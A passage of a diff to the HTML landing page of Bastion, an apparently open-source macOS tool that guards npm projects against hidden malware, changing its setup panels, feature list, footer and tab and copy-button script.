+<span class="cm"># Agents can turn protection on, never off.</span></pre>
+        </div>
+        <div class="panel" role="tabpanel" id="p-action" aria-labelledby="tab-action" hidden>
+          <button class="btn small copy-btn" type="button" data-copy="- uses: realanshuman/bastion@v4">Copy</button>
+<pre><span class="cm"># .github/workflows/bastion.yml: fails a pull request that carries a payload</span>
+<span class="ky">name</span>: Bastion
+<span class="ky">on</span>: [pull_request]
+<span class="ky">jobs</span>:
+  <span class="ky">bastion</span>:
+    <span class="ky">runs-on</span>: ubuntu-latest
+    <span class="ky">steps</span>:
+      - <span class="ky">uses</span>: <span class="st">actions/checkout@v4</span>
+      - <span class="ky">uses</span>: <span class="st">realanshuman/bastion@v4</span></pre>
+        </div>
+        <div class="panel" role="tabpanel" id="p-hooks" aria-labelledby="tab-hooks" hidden>
+          <button class="btn small copy-btn" type="button" data-copy="bastion enable git-guard">Copy</button>
+<pre><span class="cm"># Refuse to push a commit that carries the payload, in every repo</span>
+<span class="pr">$ </span>bastion enable git-guard
+
+<span class="cm"># Repos that use husky get the check in .husky/pre-push</span>
+<span class="pr">$ </span>bastion enable git-guard --husky ~/code/storefront
+
+<span class="cm"># npm, node, pnpm, yarn and bun refuse to run in an infected project</span>
+<span class="pr">$ </span>bastion enable exec-guard</pre>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <section id="principles">
+    <div class="wrap">
+      <div class="head">
+        <p class="eyebrow">Built to be trusted</p>
+        <h2>Careful by design</h2>
+      </div>
+      <div class="rules">
+        <div>
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="6.5" fill="none" stroke="currentColor" stroke-width="1.6"/><path d="M16 16l4.5 4.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
+          <h3>Proof, not alarms</h3>
+          <p>Every finding names the line and the column. If Bastion can't show you the code, it doesn't raise the alarm.</p>
+        </div>
+        <div>
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><path d="M4 12a8 8 0 1 0 2.3-5.6M4 4v4h4" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <h3>Nothing destructive</h3>
+          <p>Leftovers are quarantined, never deleted. Every file Bastion cleans has an undo.</p>
+        </div>
+        <div>
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><rect x="5" y="10.5" width="14" height="10" rx="2" fill="none" stroke="currentColor" stroke-width="1.6"/><path d="M8.5 10.5V8a3.5 3.5 0 0 1 7 0v2.5" fill="none" stroke="currentColor" stroke-width="1.6"/></svg>
+          <h3>Agents can't weaken it</h3>
+          <p>AI agents can turn protection on, never off. Lowering it is yours to do, and it's logged.</p>
+        </div>
+        <div>
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><rect x="3.5" y="5" width="17" height="11" rx="2" fill="none" stroke="currentColor" stroke-width="1.6"/><path d="M9 19.5h6M12 16v3.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
+          <h3>Runs on your Mac</h3>
+          <p>No account and no cloud. The optional online check sends package names and versions, never your code.</p>
+        </div>
+        <div>
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><path d="M13 3L5 13.5h6L10 21l8-10.5h-6L13 3z" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/></svg>
+          <h3>Fast</h3>
+          <p>A full scan of 15 repositories takes about 6 seconds. Checking one project takes under a second.</p>
+        </div>
+        <div>
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.5 8L4.5 12l4 4M15.5 8l4 4-4 4M13.5 5.5l-3 13" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <h3>Open source</h3>
+          <p>MIT licensed. Every rule Bastion uses to decide is in the repository for you to read.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <section class="end">
+    <div class="wrap">
+      <h2>Run npm without <em>the worry</em></h2>
+      <div class="actions">
+        <a class="btn solid" href="https://github.com/realanshuman/bastion/releases/latest">Download for macOS</a>
+        <a class="btn" href="https://github.com/realanshuman/bastion">View on GitHub</a>
+      </div>
+      <p class="fine">Free for everyone. macOS 14 or later. Bastion is open source and self-signed, so the first time you open it, right-click the app and choose Open.</p>
+    </div>
+  </section>
 </main>
 
-<footer class="footer">
+<footer>
   <div class="wrap">
-    <div class="foot">
-      <div class="foot-brand">
-        <a class="brand" href="#top">
-          <img src="assets/icon.png" width="24" height="24" alt="">
-          <span>Bastion</span>
-        </a>
-        <p>Stops hidden malware in JavaScript projects before it runs, and works the incident when something gets in.</p>
-      </div>
-      <div class="foot-col">
-        <h2 class="foot-h">Product</h2>
-        <a href="#layers">How it works</a>
-        <a href="#respond">Responder</a>
-        <a href="#guards">Guards</a>
-        <a href="#agents">AI agents</a>
-        <a href="#cli">Command line</a>
-      </div>
-      <div class="foot-col">
-        <h2 class="foot-h">Get started</h2>
-        <a href="https://github.com/realanshuman/bastion/releases/latest">Download for macOS</a>
-        <a href="#source">Build from source</a>
-        <a href="#pr-guard">Add the Team PR guard</a>
-        <a href="#agents">Connect an agent</a>
-      </div>
-      <div class="foot-col">
-        <h2 class="foot-h">Project</h2>
-        <a href="https://github.com/realanshuman/bastion">GitHub</a>
-        <a href="https://github.com/realanshuman/bastion/releases">Releases</a>
-        <a href="https://github.com/realanshuman/bastion/issues">Report an issue</a>
-        <a href="https://github.com/realanshuman/bastion/blob/main/LICENSE">MIT License</a>
-      </div>
-    </div>
-    <div class="foot-base">
-      <p>© 2026 Bastion contributors</p>
-      <a class="status" href="https://github.com/realanshuman/bastion/releases/latest"><i aria-hidden="true"></i>Bastion 4.1.0 is the latest release</a>
-    </div>
+    <a class="brand" href="#top"><svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2.4l7.6 3v5.8c0 4.7-3.2 8.8-7.6 10.4-4.4-1.6-7.6-5.7-7.6-10.4V5.4l7.6-3z" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M8.5 12.1l2.4 2.4 4.7-4.9" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>Bastion</a>
+    <span>Made for developers who run npm.</span>
+    <span class="spacer"></span>
+    <a href="https://github.com/realanshuman/bastion">GitHub</a>
+    <a href="https://github.com/realanshuman/bastion/releases">Releases</a>
+    <a href="https://github.com/realanshuman/bastion#readme">Docs</a>
+    <a href="https://github.com/realanshuman/bastion/blob/main/LICENSE">MIT License</a>
   </div>
 </footer>
 
 <script>
-(() => {
-  // Copy buttons copy the text of the element named in data-copy.
-  for (const btn of document.querySelectorAll('[data-copy]')) {
-    const label = btn.querySelector('span');
-    let timer;
-    btn.addEventListener('click', () => {
-      const src = document.getElementById(btn.dataset.copy);
-      if (!src) return;
-      const selectText = () => {
-        const range = document.createRange();
-        range.selectNodeContents(src);
-        const sel = window.getSelection();
-        sel.removeAllRanges();
-        sel.addRange(range);
-      };
-      const done = () => {
-        btn.classList.add('is-done');
-        label.textContent = 'Copied';
-        clearTimeout(timer);
-        timer = setTimeout(() => { btn.classList.remove('is-done'); label.textContent = 'Copy'; }, 1600);
-      };
-      try { navigator.clipboard.writeText(src.textContent.trim()).then(done, selectText); } catch (e) { selectText(); }
+  // tabs: click, or the arrow keys
+  const tabs = Array.from(document.querySelectorAll('[role="tab"]'));
+  function select(tab) {
+    tabs.forEach(t => {
+      const on = t === tab;
+      t.setAttribute('aria-selected', String(on));
+      t.tabIndex = on ? 0 : -1;
+      document.getElementById(t.getAttribute('aria-controls')).hidden = !on;
     });
   }
-
-  // Tabs: click or arrow keys switch panels.
-  for (const list of document.querySelectorAll('[role="tablist"]')) {
-    const tabs = [...list.querySelectorAll('[role="tab"]')];
-    const select = (tab, focus) => {
-      for (const t of tabs) {
-        const on = t === tab;
-        t.setAttribute('aria-selected', String(on));
-        t.tabIndex = on ? 0 : -1;
-        document.getElementById(t.getAttribute('aria-controls')).hidden = !on;
-      }
-      if (focus) tab.focus();
-    };
-    tabs.forEach((tab, i) => {
-      tab.addEventListener('click', () => select(tab));
-      tab.addEventListener('keydown', e => {
-        const next = { ArrowRight: i + 1, ArrowLeft: i - 1, Home: 0, End: tabs.length - 1 }[e.key];
-        if (next === undefined) return;
-        e.preventDefault();
-        select(tabs[(next + tabs.length) % tabs.length], true);
-      });
+  tabs.forEach((t, i) => {
+    t.addEventListener('click', () => select(t));
+    t.addEventListener('keydown', e => {
+      if (e.key !== 'ArrowRight' && e.key !== 'ArrowLeft') return;
+      const next = tabs[(i + (e.key === 'ArrowRight' ? 1 : tabs.length - 1)) % tabs.length];
+      select(next); next.focus();
     });
-  }
-
-  // FIG 1: a five-bastion star fort with one wall per layer, and the watcher's sweep.
-  const fort = document.getElementById('fort');
-  if (!fort) return;
-  const NS = 'http://www.w3.org/2000/svg';
-  const R = 220;
-  const WALLS = [1, .74, .5, .28];
-  const add = (parent, tag, attrs = {}, text) => {
-    const el = document.createElementNS(NS, tag);
-    for (const k in attrs) el.setAttribute(k, attrs[k]);
-    if (text) el.textContent = text;
-    parent.appendChild(el);
-    return el;
-  };
-  const polar = (deg, r) => [Math.cos(deg * Math.PI / 180) * r, Math.sin(deg * Math.PI / 180) * r];
-  const path = (pts, close) => 'M' + pts.map(p => p[0].toFixed(1) + ' ' + p[1].toFixed(1)).join(' L') + (close ? 'Z' : '');
-  // Each bastion: curtain end, flank, face to the point, face, flank, curtain start.
-  const trace = s => {
-    const pts = [];
-    for (let i = 0; i < 5; i++) {
-      const a = (-90 + i * 72) * Math.PI / 180, cos = Math.cos(a), sin = Math.sin(a);
-      const at = (u, v) => [(cos * u - sin * v) * R * s, (sin * u + cos * v) * R * s];
-      pts.push(at(.66, -.13), at(.72, -.2), at(1, 0), at(.72, .2), at(.66, .13));
-    }
-    return path(pts, true);
-  };
-
-  const defs = add(fort, 'defs');
-  const fade = add(defs, 'linearGradient', { id: 'sweep-fade', gradientUnits: 'userSpaceOnUse', x1: 0, y1: 0, x2: 0, y2: -R * .85 });
-  add(fade, 'stop', { offset: 0, 'stop-color': '#8E97F2', 'stop-opacity': .3 });
-  add(fade, 'stop', { offset: 1, 'stop-color': '#8E97F2', 'stop-opacity': 0 });
-  add(add(defs, 'clipPath', { id: 'fort-clip' }), 'path', { d: trace(1) });
-
-  const back = add(fort, 'g');
-  add(back, 'circle', { class: 'bezel', r: R * 1.14 });
-  for (let d = 0; d < 360; d += 5) {
-    const major = d % 30 === 0;
-    const [x1, y1] = polar(d, R * 1.19), [x2, y2] = polar(d, R * (major ? 1.25 : 1.22));
-    add(back, 'line', { class: major ? 'tick major' : 'tick', x1, y1, x2, y2 });
-  }
-  add(back, 'line', { class: 'cross', x1: -R * 1.19, y1: 0, x2: R * 1.19, y2: 0 });
-  add(back, 'line', { class: 'cross', x1: 0, y1: -R * 1.19, x2: 0, y2: R * 1.19 });
-
-  for (const s of WALLS) add(fort, 'path', { class: 'floor', d: trace(s) });
-
-  const sweep = add(add(fort, 'g', { 'clip-path': 'url(#fort-clip)' }), 'g', { class: 'sweep' });
-  const reach = R * 1.05, [ex, ey] = polar(-55, reach);
-  add(sweep, 'path', { d: `M0 0 L${reach} 0 A${reach} ${reach} 0 0 0 ${ex.toFixed(1)} ${ey.toFixed(1)}Z`, fill: 'url(#sweep-fade)' });
-  add(sweep, 'line', { class: 'sweep-edge', x1: 0, y1: 0, x2: reach, y2: 0 });
-
-  WALLS.forEach((s, i) => {
-    add(fort, 'path', { class: `wall wall-${i + 1}`, d: trace(s) });
-    add(fort, 'path', { class: 'wall-inner', d: trace(s * .93) });
   });
-  for (let i = 0; i < 5; i++) {
-    const m = -54 + i * 72; // a ravelin in front of each outer curtain
-    add(fort, 'path', { class: 'ravelin', d: path([polar(m - 13, R * .76), polar(m, R * .95), polar(m + 13, R * .76)]) });
-  }
-  WALLS.forEach((s, i) => add(fort, 'text', { class: `ring-label label-${i + 1}`, x: 0, y: (-R * s - 9).toFixed(1) }, `${i + 1}.0`));
-
-  const [bx, by] = polar(54, R * .86);
-  const blip = add(fort, 'g', { transform: `translate(${bx.toFixed(1)} ${by.toFixed(1)})` });
-  add(blip, 'circle', { class: 'blip-ring', r: 4 });
-  add(blip, 'circle', { class: 'blip-dot', r: 3.5 });
-
-  const keep = add(fort, 'g', { class: 'keep' });
-  add(keep, 'path', { d: 'M0 -17 L13 -12 V-1 C13 8 7.5 13.5 0 17 C-7.5 13.5 -13 8 -13 -1 V-12 Z' });
-  add(keep, 'path', { class: 'keep-check', d: 'M-5.5 0 L-1.5 4 L6 -4.5' });
-
-  // Hovering a layer lights up its wall.
-  const list = document.querySelector('.layer-list');
-  for (const item of document.querySelectorAll('.layer')) {
-    item.addEventListener('mouseenter', () => {
-      fort.dataset.active = item.dataset.ring;
-      list.classList.add('has-active');
-      item.classList.add('is-active');
+  // copy buttons: fall back to selecting the text when the clipboard is refused
+  document.querySelectorAll('[data-copy]').forEach(btn => {
+    btn.addEventListener('click', async () => {
+      const text = btn.getAttribute('data-copy');
+      try { await navigator.clipboard.writeText(text); btn.textContent = 'Copied'; }
+      catch (e) {
+        const pre = btn.parentElement.querySelector('pre');
+        const range = document.createRange(); range.selectNodeContents(pre);
+        const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
+        btn.textContent = 'Selected';
+      }
+      setTimeout(() => { btn.textContent = 'Copy'; }, 1600);
     });
-    item.addEventListener('mouseleave', () => {
-      delete fort.dataset.active;
-      list.classList.remove('has-active');
-      item.classList.remove('is-active');
-    });
-  }
-})();
+  });
 </script>
 </body>
 </html>
